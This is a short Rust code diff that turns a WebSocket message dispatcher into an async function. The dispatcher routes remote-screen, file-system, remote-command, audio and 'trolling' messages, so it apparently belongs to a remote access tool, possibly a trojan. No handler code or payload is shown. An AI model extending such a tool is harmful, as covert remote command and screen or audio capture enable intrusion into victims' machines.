@@ -47,10 +47,10 @@ impl MessageType {
 	}
 }
 
-pub fn handle_message(message: MessageType, payload: &[u8], socket: &mut WebSocket<MaybeTlsStream<TcpStream>>) {
+pub async fn handle_message(message: MessageType, payload: &[u8], socket: &mut WebSocket<MaybeTlsStream<TcpStream>>) {
 	match message {
-		MessageType::RemoteScreen => handle_remote_screen(payload),
-		MessageType::FileSystem => handle_file_system(payload),
+		MessageType::RemoteScreen => handle_remote_screen(payload, socket).await,
+		MessageType::FileSystem =>  handle_file_system(payload) ,
 		MessageType::Trolling => handle_trolling(payload),
 		MessageType::RemoteCMD => handle_remote_cmd(payload, socket),
 		MessageType::Audio => handle_audio(payload),
